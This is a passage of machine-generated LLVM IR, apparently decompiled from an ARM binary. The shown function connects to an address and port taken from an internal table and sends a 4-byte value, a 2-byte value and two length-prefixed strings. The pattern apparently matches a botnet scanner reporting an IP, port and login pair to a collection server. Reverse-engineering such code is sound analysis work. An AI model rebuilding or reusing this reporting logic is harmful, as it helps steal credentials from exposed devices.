dec_label_pc_12100:                               ; preds = %dec_label_pc_114c0, %dec_label_pc_114a4
  %v0_12100 = load i32, i32* @r7, align 4
  %v1_12100 = load i32, i32* @r4, align 4
  %v2_12100 = add i32 %v1_12100, 12
  %v3_12100 = inttoptr i32 %v2_12100 to i32*
  store i32 %v0_12100, i32* %v3_12100, align 4
  %v0_12104 = load i32, i32* @r7, align 4
  %v1_12104 = trunc i32 %v0_12104 to i8
  %v2_12104 = load i32, i32* @r4, align 4
  %v3_12104 = add i32 %v2_12104, 284
  %v4_12104 = inttoptr i32 %v3_12104 to i8*
  store i8 %v1_12104, i8* %v4_12104, align 1
  br label %bb307

dec_label_pc_1210c:                               ; preds = %dec_label_pc_1164c, %dec_label_pc_11604
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12110

dec_label_pc_12110:                               ; preds = %dec_label_pc_11674, %dec_label_pc_1210c
  %v0_12118 = phi i32 [ 0, %dec_label_pc_1210c ], [ %v0_11654, %dec_label_pc_11674 ]
  %v0_12110 = load i32, i32* @r5, align 4
  %v1_12110 = add i32 %v0_12110, 4
  %v2_12110 = inttoptr i32 %v1_12110 to i32*
  %v3_12110 = load i32, i32* %v2_12110, align 4
  store i32 %v3_12110, i32* @r4, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_12118 = inttoptr i32 %v0_12110 to i32*
  store i32 %v0_12118, i32* %v2_12118, align 4
  %v0_1211c = load i32, i32* %ip.global-to-local, align 4
  %v1_1211c = load i32, i32* @r5, align 4
  %v2_1211c = add i32 %v1_1211c, 24
  %v3_1211c = inttoptr i32 %v2_1211c to i32*
  store i32 %v0_1211c, i32* %v3_1211c, align 4
  %v0_11544.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_11544

dec_label_pc_12124:                               ; preds = %dec_label_pc_115c4
  %v0_12124 = load i32, i32* @r5, align 4
  %v1_12124 = add i32 %v0_12124, 4
  %v2_12124 = inttoptr i32 %v1_12124 to i32*
  %v3_12124 = load i32, i32* %v2_12124, align 4
  store i32 %v3_12124, i32* %r0.global-to-local, align 4
  %v1_12128 = call i32 @function_13654(i32 %v3_12124)
  store i32 %v1_12128, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v0_12130 = load i32, i32* @r6, align 4
  %v1_12130 = load i32, i32* @r5, align 4
  %v2_12130 = add i32 %v1_12130, 12
  %v3_12130 = inttoptr i32 %v2_12130 to i32*
  store i32 %v0_12130, i32* %v3_12130, align 4
  %v0_12134 = load i32, i32* %r4.global-to-local, align 4
  %v1_12134 = load i32, i32* @r5, align 4
  %v2_12134 = add i32 %v1_12134, 4
  %v3_12134 = inttoptr i32 %v2_12134 to i32*
  store i32 %v0_12134, i32* %v3_12134, align 4
  %v0_12138 = load i32, i32* @r6, align 4
  %v1_12138 = trunc i32 %v0_12138 to i8
  %v2_12138 = load i32, i32* @r5, align 4
  %v3_12138 = add i32 %v2_12138, 284
  %v4_12138 = inttoptr i32 %v3_12138 to i8*
  store i8 %v1_12138, i8* %v4_12138, align 1
  br label %dec_label_pc_11568

dec_label_pc_12140:                               ; preds = %dec_label_pc_12020
  store i32 %stack_var_-1868.0, i32* %r1.global-to-local, align 4
  store i32 104, i32* %r3.global-to-local, align 4
  store i32 104, i32* %v2_116f0, align 4
  br label %dec_label_pc_1203c

dec_label_pc_12150:                               ; preds = %dec_label_pc_11e58
  store i32 2, i32* @r5, align 4
  %v1_12154 = add i32 %v2_11e74, 4
  %v2_12154 = inttoptr i32 %v1_12154 to i32*
  %v3_12154 = load i32, i32* %v2_12154, align 4
  store i32 %v3_12154, i32* @r4, align 4
  store i32 2, i32* %stack_var_-92, align 4
  %v0_12160 = call i32 @function_fe60()
  store i32 %v0_12160, i32* %r0.global-to-local, align 4
  %v0_12164 = load i32, i32* @r8, align 4
  %v1_12164 = inttoptr i32 %v0_12164 to i8*
  %v2_12164 = load i8, i8* %v1_12164, align 1
  %v3_12164 = zext i8 %v2_12164 to i32
  store i32 %v3_12164, i32* %r1.global-to-local, align 4
  %v2_12168 = call i32 @function_133b0(i32 %v0_12160, i32 %v3_12164)
  store i32 %v2_12168, i32* %r0.global-to-local, align 4
  %v0_1216c = load i32, i32* @r4, align 4
  %v2_1216c = and i32 %v2_12168, 1073741824
  %v3_1216c = icmp ne i32 %v2_1216c, 0
  store i1 %v3_1216c, i1* %cpsr_c.global-to-local, align 1
  %v4_1216c = mul i32 %v2_12168, 4
  %v5_1216c = add i32 %v0_1216c, %v4_1216c
  %v6_1216c = inttoptr i32 %v5_1216c to i32*
  %v7_1216c = load i32, i32* %v6_1216c, align 4
  store i32 %v7_1216c, i32* %r3.global-to-local, align 4
  %v0_12170 = load i32, i32* @sl, align 4
  store i32 %v0_12170, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r0.global-to-local, align 4
  %v2_1217c = inttoptr i32 %v0_12170 to i32*
  %v3_1217c = call i32 @function_12288(i32 19, i32* %v2_1217c)
  %v4_1217c = inttoptr i32 %v3_1217c to i8*
  store i32 %v3_1217c, i32* %r0.global-to-local, align 4
  %v2_12180 = add i32 %v3_1217c, 1
  %v3_12180 = inttoptr i32 %v2_12180 to i8*
  %v4_12180 = load i8, i8* %v3_12180, align 1
  %v5_12180 = zext i8 %v4_12180 to i32
  store i32 %v5_12180, i32* %r2.global-to-local, align 4
  %v3_12184 = load i8, i8* %v4_1217c, align 1
  %v4_12184 = zext i8 %v3_12184 to i32
  %v4_12188 = mul nuw nsw i32 %v5_12180, 256
  %v5_12188 = or i32 %v4_12184, %v4_12188
  store i32 %v5_12188, i32* %r3.global-to-local, align 4
  %v1_1218c = and i32 %v4_12184, 128
  %v2_1218c = icmp ne i32 %v1_1218c, 0
  store i1 %v2_1218c, i1* %cpsr_c.global-to-local, align 1
  store i32 %v5_12180, i32* %r1.global-to-local, align 4
  %v0_12190 = load i32, i32* @r8, align 4
  store i32 %v0_12190, i32* %r0.global-to-local, align 4
  %v6_1219c = call i32 @function_10120(i32 %v0_12190)
  store i32 18, i32* %r0.global-to-local, align 4
  %v1_121a4 = call i32 @function_122b4(i32 18)
  store i32 19, i32* %r0.global-to-local, align 4
  %v1_121ac = call i32 @function_122b4(i32 19)
  %v0_121b4 = load i32, i32* @r6, align 4
  store i32 %v0_121b4, i32* %r0.global-to-local, align 4
  %v2_121b8 = ptrtoint i32* %stack_var_-92 to i32
  store i32 %v2_121b8, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_121c0 = bitcast i32* %stack_var_-92 to %sockaddr*
  %v4_121c0 = call i32 @function_13dac(i32 %v0_121b4, %sockaddr* %v3_121c0, i32 16)
  store i32 %v4_121c0, i32* %r0.global-to-local, align 4
  %v3_121c4 = icmp eq i32 %v4_121c0, -1
  store i1 %v3_121c4, i1* %cpsr_c.global-to-local, align 1
  %v8_121c4 = icmp eq i32 %v4_121c0, -1
  store i1 %v8_121c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_121c4, label %dec_label_pc_121cc, label %dec_label_pc_121dc

dec_label_pc_121cc:                               ; preds = %dec_label_pc_12150
  %v0_121cc = load i32, i32* @r6, align 4
  store i32 %v0_121cc, i32* %r0.global-to-local, align 4
  %v1_121d0 = call i32 @function_13654(i32 %v0_121cc)
  %v0_121d4 = load i32, i32* @sl, align 4
  store i32 %v0_121d4, i32* %r0.global-to-local, align 4
  %v1_121d8 = call i32 @function_149f0(i32 %v0_121d4)
  store i32 %v1_121d8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_121dc

dec_label_pc_121dc:                               ; preds = %dec_label_pc_12150, %dec_label_pc_121cc
  store i32 %v2_11b00, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_121ec = load i32, i32* @r6, align 4
  store i32 %v0_121ec, i32* %r0.global-to-local, align 4
  %v0_121f0 = load i32, i32* @sl, align 4
  store i32 %v0_121f0, i32* %stack_var_-56, align 4
  %v6_121f4 = call i32 @function_13ec0(i32 %v0_121ec, i32* nonnull %stack_var_-56, i32 1, i32 16384)
  store i32 %v2_11bb4, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_12208 = load i32, i32* @r6, align 4
  store i32 %v0_12208, i32* %r0.global-to-local, align 4
  %v5_1220c = call i32 @function_13ec0(i32 %v0_12208, i32* nonnull %stack_var_-48, i32 4, i32 16384)
  %v0_12214 = load i32, i32* @r5, align 4
  store i32 %v0_12214, i32* %r2.global-to-local, align 4
  %v2_12218 = ptrtoint i32* %stack_var_-38 to i32
  store i32 %v2_12218, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_12220 = load i32, i32* @r6, align 4
  store i32 %v0_12220, i32* %r0.global-to-local, align 4
  %v5_12224 = call i32 @function_13ec0(i32 %v0_12220, i32* nonnull %stack_var_-38, i32 %v0_12214, i32 16384)
  %v0_12228 = load i32, i32* @fp, align 4
  %v1_12228 = add i32 %v0_12228, 12
  store i32 %v1_12228, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_12234 = load i32, i32* @r6, align 4
  store i32 %v0_12234, i32* %r0.global-to-local, align 4
  %v4_12238 = inttoptr i32 %v1_12228 to i32*
  %v5_12238 = call i32 @function_13ec0(i32 %v0_12234, i32* %v4_12238, i32 1, i32 16384)
  store i32 %v5_12238, i32* %r0.global-to-local, align 4
  %v0_1223c = load i32, i32* @fp, align 4
  %v1_1223c = inttoptr i32 %v0_1223c to i32*
  %v2_1223c = load i32, i32* %v1_1223c, align 4
  store i32 %v2_1223c, i32* %r1.global-to-local, align 4
  %v1_12240 = add i32 %v0_1223c, 12
  %v2_12240 = inttoptr i32 %v1_12240 to i8*
  %v3_12240 = load i8, i8* %v2_12240, align 1
  %v4_12240 = zext i8 %v3_12240 to i32
  store i32 %v4_12240, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_12248 = load i32, i32* @r6, align 4
  store i32 %v0_12248, i32* %r0.global-to-local, align 4
  %v4_1224c = inttoptr i32 %v2_1223c to i32*
  %v5_1224c = call i32 @function_13ec0(i32 %v0_12248, i32* %v4_1224c, i32 %v4_12240, i32 16384)
  %v0_12250 = load i32, i32* @fp, align 4
  %v1_12250 = add i32 %v0_12250, 13
  store i32 %v1_12250, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_1225c = load i32, i32* @r6, align 4
  store i32 %v0_1225c, i32* %r0.global-to-local, align 4
  %v4_12260 = inttoptr i32 %v1_12250 to i32*
  %v5_12260 = call i32 @function_13ec0(i32 %v0_1225c, i32* %v4_12260, i32 1, i32 16384)
  %v0_12264 = load i32, i32* @r6, align 4
  store i32 %v0_12264, i32* %r0.global-to-local, align 4
  %v0_12268 = load i32, i32* @fp, align 4
  %v1_12268 = add i32 %v0_12268, 13
  %v2_12268 = inttoptr i32 %v1_12268 to i8*
  %v3_12268 = load i8, i8* %v2_12268, align 1
  %v4_12268 = zext i8 %v3_12268 to i32
  store i32 %v4_12268, i32* %r2.global-to-local, align 4
  %v1_1226c = add i32 %v0_12268, 4
  %v2_1226c = inttoptr i32 %v1_1226c to i32*
  %v3_1226c = load i32, i32* %v2_1226c, align 4
  store i32 %v3_1226c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_12274 = inttoptr i32 %v3_1226c to i32*
  %v5_12274 = call i32 @function_13ec0(i32 %v0_12264, i32* %v4_12274, i32 %v4_12268, i32 16384)
  %v0_12278 = load i32, i32* @r6, align 4
  store i32 %v0_12278, i32* %r0.global-to-local, align 4
  %v1_1227c = call i32 @function_13654(i32 %v0_12278)
  store i32 %v1_1227c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12280

dec_label_pc_12280:                               ; preds = %dec_label_pc_11e3c, %dec_label_pc_121dc
  %v0_12280 = load i32, i32* @sl, align 4
  store i32 %v0_12280, i32* %r0.global-to-local, align 4
  %v1_12284 = call i32 @function_149f0(i32 %v0_12280)
  store i32 %v1_12284, i32* %r0.global-to-local, align 4
  ret i32 %v1_12284

; uselistorder directives
  uselistorder i32 %v4_12184, { 1, 0 }
  uselistorder i32 %v5_12180, { 1, 0, 2 }
  uselistorder i32 %v2_12168, { 1, 0, 2 }
  uselistorder i32 %v3_120b8, { 1, 0 }
  uselistorder i32 %v5_1208c, { 2, 0, 3, 4, 1 }
  uselistorder i1 %v1_1205c, { 1, 0 }
  uselistorder i32 %v1_1204c, { 2, 1, 0 }
  uselistorder i32 %v1_12048, { 1, 0 }
  uselistorder i32 %v0_12004, { 1, 0, 2 }
  uselistorder i32 %v1_11fec, { 2, 1, 0 }
  uselistorder i32 %v0_11f98, { 1, 2, 0 }
  uselistorder i1 %v7_11f0c, { 1, 0 }
  uselistorder i32 %v1_11f08, { 2, 1, 3, 4, 0 }
  uselistorder i1 %v8_11f00, { 1, 0 }
  uselistorder i8 %v3_11ef8, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_11f08, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_11ee4, { 1, 0 }
  uselistorder i1 %v7_11edc, { 1, 0 }
  uselistorder i1 %v7_11ed4, { 1, 0 }
  uselistorder i32 %v0_11eb0, { 1, 2, 0 }
  uselistorder i32 %v2_11e9c, { 1, 0 }
  uselistorder i32 %v1_11e9c, { 1, 3, 0, 2, 4 }
  uselistorder i32 %v0_11e9c, { 3, 2, 5, 0, 1, 4, 6 }
  uselistorder i1 %v7_11e4c, { 1, 0 }
  uselistorder i32 %v3_11e48, { 1, 0, 2, 3 }
  uselistorder i1 %v2_11e34, { 1, 0 }
  uselistorder i32 %.348, { 1, 0 }
  uselistorder i1 %v7_11e1c, { 1, 0 }
  uselistorder i32 %v0_11e18, { 2, 1, 0, 3 }
  uselistorder i32 %v4_11df8, { 1, 0, 2 }
  uselistorder i32 %v4_11df4, { 1, 0, 2 }
  uselistorder i1 %v7_11de4, { 1, 0 }
  uselistorder i32 %v0_11de4, { 3, 2, 0, 4, 1 }
  uselistorder i1 %v7_11d00, { 1, 0 }
  uselistorder i32 %v1_11cfc, { 2, 1, 3, 4, 0 }
  uselistorder i1 %v8_11cf4, { 1, 0 }
  uselistorder i8 %v3_11cec, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_11cfc, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_11cd8, { 1, 0 }
  uselistorder i1 %v7_11cd0, { 1, 0 }
  uselistorder i1 %v7_11cc8, { 1, 0 }
  uselistorder i1 %v7_11c4c, { 1, 0 }
  uselistorder i32 %v1_11c48, { 2, 1, 3, 4, 0 }
  uselistorder i1 %v8_11c40, { 1, 0 }
  uselistorder i8 %v3_11c38, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_11c48, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_11c24, { 1, 0 }
  uselistorder i1 %v7_11c1c, { 1, 0 }
  uselistorder i1 %v7_11c14, { 1, 0 }
  uselistorder i1 %v7_11b98, { 1, 0 }
  uselistorder i32 %v1_11b94, { 2, 1, 3, 4, 0 }
  uselistorder i1 %v8_11b8c, { 1, 0 }
  uselistorder i8 %v3_11b84, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_11b94, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_11b70, { 1, 0 }
  uselistorder i1 %v7_11b68, { 1, 0 }
  uselistorder i1 %v7_11b60, { 1, 0 }
  uselistorder i1 %v7_11ae4, { 1, 0 }
  uselistorder i32 %v1_11ae0, { 2, 1, 3, 4, 0 }
  uselistorder i1 %v8_11ad8, { 1, 0 }
  uselistorder i8 %v3_11ad0, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_11ae0, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_11abc, { 1, 0 }
  uselistorder i1 %v7_11ab4, { 1, 0 }
  uselistorder i1 %v7_11aac, { 1, 0 }
  uselistorder i32 %v0_11a54, { 2, 1, 0 }
  uselistorder i1 %v7_11a4c, { 1, 0 }
  uselistorder i1 %v8_11a40, { 1, 0 }
  uselistorder i8 %v3_11a38, { 4, 5, 6, 7, 8, 3, 2, 1, 0 }
  uselistorder i32 %v0_11a48, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_11a24, { 1, 0 }
  uselistorder i1 %v7_11a1c, { 1, 0 }
  uselistorder i32 %v3_11a08, { 1, 0, 2, 3 }
  uselistorder i32 %v0_118c4, { 2, 1, 0 }
  uselistorder i1 %v7_118bc, { 1, 0 }
  uselistorder i1 %v8_118b0, { 1, 0 }
  uselistorder i8 %v3_118a8, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_118b8, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_11894, { 1, 0 }
  uselistorder i1 %v7_1188c, { 1, 0 }
  uselistorder i1 %v7_11884, { 1, 0 }
  uselistorder i32 %v3_11870, { 2, 3, 0, 1 }
  uselistorder i32 %v0_11860.pre, { 0, 2, 1 }
  uselistorder i32 %v1_11848, { 1, 0 }
  uselistorder i32 %v1_11844, { 1, 0 }
  uselistorder i32 %v1_1183c, { 0, 2, 3, 4, 5, 1 }
  uselistorder i32 %v3_11838, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_11838, { 0, 2, 1 }
  uselistorder i1 %v7_117e0, { 1, 0 }
  uselistorder i1 %v2_117cc, { 1, 0, 2 }
  uselistorder i1 %v2_117b4, { 1, 0, 2 }
  uselistorder i32 %v1_117d4, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v1_117a8, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v1_117d0, { 1, 0 }
  uselistorder i32 %v2_117d8, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 %v0_11750, { 4, 19, 5, 17, 6, 18, 7, 16, 8, 15, 9, 14, 10, 13, 3, 0, 11, 12, 20, 2, 1 }
  uselistorder i32 %v1_1172c, { 1, 2, 3, 0 }
  uselistorder i32 %v3_11728, { 1, 0 }
  uselistorder i32 %v5_1170c, { 0, 2, 1, 3, 4, 5, 6, 7 }
  uselistorder i32 %v2_116f8, { 1, 0, 2 }
  uselistorder i32 %v3_116f4, { 1, 0, 2 }
  uselistorder i32 %v0_120c8, { 1, 0, 2 }
  uselistorder i32 %v5_116bc, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v5_1169c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_11654, { 0, 3, 2, 4, 6, 5, 1 }
  uselistorder i32 %v3_11634, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_11628, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_115b4, { 2, 1, 0 }
  uselistorder i32 %v3_115b0, { 1, 0 }
  uselistorder i1 %v7_11598, { 1, 0 }
  uselistorder i32 %v3_11594, { 5, 4, 2, 1, 0, 6, 7, 3 }
  uselistorder i32 %v0_11588, { 1, 0 }
  uselistorder i32 %v1_1156c, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %v1_11558, { 2, 1, 0 }
  uselistorder i32 %v3_11554, { 1, 0 }
  uselistorder i32 %v0_11558, { 1, 0 }
  uselistorder i32 %v2_11bb4, { 0, 2, 3, 1 }
  uselistorder i32 %v2_11b00, { 4, 5, 3, 2, 6, 7, 1, 0 }
  uselistorder i32 %v2_11f8c, { 1, 2, 0 }
  uselistorder i32 %v2_11798, { 0, 2, 1 }
  uselistorder i32 %v1_114ec, { 0, 1, 3, 2 }
  uselistorder i32 %v0_114ec, { 0, 1, 3, 2 }
  uselistorder i32 %v1_114c8, { 2, 1, 0 }
  uselistorder i32 %v1_114c4, { 1, 0 }
  uselistorder i32 %v0_11494, { 0, 2, 1 }
  uselistorder i32 %v1_1148c, { 1, 0 }
  uselistorder i1 %v7_11458, { 0, 3, 1, 2 }
  uselistorder i1 %v2_11458, { 1, 2, 0 }
  uselistorder i32 %v2_11450, { 0, 3, 4, 2, 1 }
  uselistorder i32 %v0_11448, { 1, 0 }
  uselistorder i32 %v1_1142c, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %v1_11420, { 0, 1, 3, 2 }
  uselistorder i32 %v0_11420, { 0, 2, 1 }
  uselistorder i32 %v1_11410, { 1, 0 }
  uselistorder i32 %v3_11474, { 4, 7, 5, 6, 1, 0, 9, 3, 2, 8 }
  uselistorder i32 %storemerge222, { 1, 0, 2 }
  uselistorder i32 %v2_11480, { 0, 4, 1, 5, 2, 7, 3, 6 }
  uselistorder i32 %stack_var_-1868.0, { 1, 0, 2, 3 }
  uselistorder i32 %v3_11360, { 1, 0 }
  uselistorder i32 %v1_1134c, { 1, 0 }
  uselistorder i32 %v1_11334, { 1, 2, 0 }
  uselistorder i32 %v0_11340, { 0, 3, 2, 1 }
  uselistorder i32 %v0_11304, { 2, 1, 0, 3, 5, 4 }
  uselistorder i32 %v2_112f8, { 2, 1, 0 }
  uselistorder i32 %v1_112d4, { 3, 1, 0, 4, 2 }
  uselistorder i32 %v3_112b4, { 1, 2, 0, 3 }
  uselistorder i1 %v2_112ac, { 1, 0 }
  uselistorder i32 %v4_1124c, { 2, 3, 7, 0, 1, 5, 4, 6 }
  uselistorder i32 %v1_111b4, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v4_110d4, { 1, 0 }
  uselistorder i32 %v1_110d0, { 2, 0, 1 }
  uselistorder i32 %v4_110ac, { 1, 0 }
  uselistorder i32 %v5_11094, { 0, 2, 1 }
  uselistorder i1 %v2_1101c, { 1, 0 }
  uselistorder i1 %v3_11000, { 1, 0, 2 }
  uselistorder i1 %v2_10fec, { 1, 0 }
  uselistorder i1 %v2_10fc8, { 1, 0 }
  uselistorder i32 %v1_10f78, { 14, 13, 12, 11, 15, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_10f64, { 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 20, 21, 22, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 6, 7, 8, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_10f60, { 4, 5, 6, 0, 7, 1, 2, 3, 8 }
  uselistorder i32 %v4_10f50, { 1, 0 }
  uselistorder i32 %v0_10f40, { 0, 1, 3, 2 }
  uselistorder i32 %v0_10f30, { 1, 0 }
  uselistorder i32 %v0_11240, { 0, 1, 2, 5, 6, 7, 9, 3, 4, 8, 10 }
  uselistorder i8* %stack_var_-1884.0, { 0, 1, 2, 3, 6, 4, 5 }
  uselistorder i32 %stack_var_-1872.0, { 0, 3, 2, 1 }
  uselistorder i32 %v4_10b04, { 1, 0 }
  uselistorder i32 %v0_10af8, { 2, 0, 1, 3 }
  uselistorder i32 %v4_10aa4, { 1, 0 }
  uselistorder i32 %v0_10a9c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_10a44, { 3, 2, 0, 1 }
  uselistorder i1 %v7_109e8, { 1, 0 }
  uselistorder i32 %v3_109e0, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32 %v0_109c8, { 0, 2, 1 }
  uselistorder i32 %v0_109b0, { 2, 1, 0 }
  uselistorder i32 %v0_1098c, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %storemerge229, { 1, 0 }
  uselistorder i32 %v0_10924, { 3, 1, 2, 0, 4 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 11, 14, 12, 13 }
  uselistorder i32* %stack_var_-92, { 0, 4, 1, 2, 3, 5 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 4, 5, 3, 6, 2, 7, 0, 8, 9 }
  uselistorder i32* %stack_var_-56, { 0, 6, 7, 3, 8, 4, 9, 5, 10, 2, 11, 1, 12, 13 }
  uselistorder i32* %stack_var_-84, { 1, 0 }
  uselistorder i32* %stack_var_-38, { 0, 2, 1 }
  uselistorder i32 %tmp239, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2, 3, 4, 6, 5, 7 }
  uselistorder i32* %r5.global-to-local, { 3, 1, 2, 0, 4, 5 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2 }
  uselistorder i32* %r3.global-to-local, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 64, 65, 46, 36, 66, 67, 68, 69, 70, 13, 14, 47, 48, 49, 50, 0, 1, 2, 3, 15, 105, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 37, 38, 39, 42, 43, 59, 60, 61, 44, 45, 51, 52, 53, 54, 55, 56, 57, 58, 71, 72, 73, 74, 75, 76, 62, 63, 77, 78, 80, 79, 81, 82, 83, 84, 85, 87, 89, 88, 86, 90, 91, 92, 93, 99, 94, 95, 96, 97, 101, 100, 40, 103, 102, 41, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 104, 124, 125, 126, 127, 128, 129, 131, 130, 133, 132, 98, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 35, 31, 44, 36, 0, 1, 2, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 24, 23, 25, 27, 26, 28, 30, 29, 32, 34, 33, 40, 41, 42, 37, 38, 39, 45, 46, 47, 48, 49, 50, 51, 43, 65, 52, 53, 54, 55, 56, 58, 60, 59, 165, 57, 61, 62, 63, 64, 69, 66, 67, 68, 70, 72, 74, 73, 71, 75, 76, 77, 78, 79, 80, 81, 82, 85, 86, 87, 88, 89, 90, 91, 83, 84, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 156, 155, 157, 158, 159, 160, 161, 162, 163, 164, 166 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 46, 47, 41, 42, 35, 14, 15, 0, 1, 2, 39, 40, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 36, 37, 43, 44, 146, 48, 49, 50, 45, 38, 51, 52, 53, 55, 56, 54, 57, 58, 60, 59, 145, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144 }
  uselistorder i32* %r0.global-to-local, { 11, 10, 13, 12, 14, 15, 16, 18, 17, 19, 20, 21, 22, 23, 24, 26, 25, 27, 29, 28, 31, 30, 32, 33, 125, 124, 35, 126, 110, 112, 111, 100, 99, 127, 129, 128, 34, 37, 36, 38, 113, 1, 0, 2, 4, 3, 6, 5, 7, 8, 9, 116, 40, 39, 41, 43, 42, 44, 45, 47, 46, 48, 50, 49, 51, 53, 52, 54, 55, 56, 57, 58, 59, 61, 60, 63, 62, 65, 64, 66, 67, 68, 69, 71, 70, 73, 72, 75, 74, 76, 77, 78, 79, 81, 80, 83, 82, 85, 84, 86, 87, 88, 89, 91, 90, 93, 92, 95, 94, 96, 97, 98, 102, 101, 105, 103, 104, 107, 118, 117, 120, 119, 108, 109, 115, 114, 133, 130, 131, 122, 121, 123, 140, 132, 135, 134, 136, 137, 139, 138, 141, 147, 142, 143, 146, 144, 145, 148, 150, 151, 149, 242, 153, 154, 241, 155, 156, 106, 157, 152, 158, 159, 160, 162, 161, 163, 164, 166, 165, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 230, 229, 232, 231, 233, 237, 236, 234, 235, 238, 239, 243, 240 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 3, 4, 5, 0, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %ip.global-to-local, { 23, 24, 2, 25, 3, 17, 0, 1, 21, 4, 5, 7, 6, 9, 8, 11, 10, 12, 13, 15, 20, 16, 22, 18, 19, 26, 27, 28, 29, 30, 31, 34, 32, 33, 35, 14, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50 }
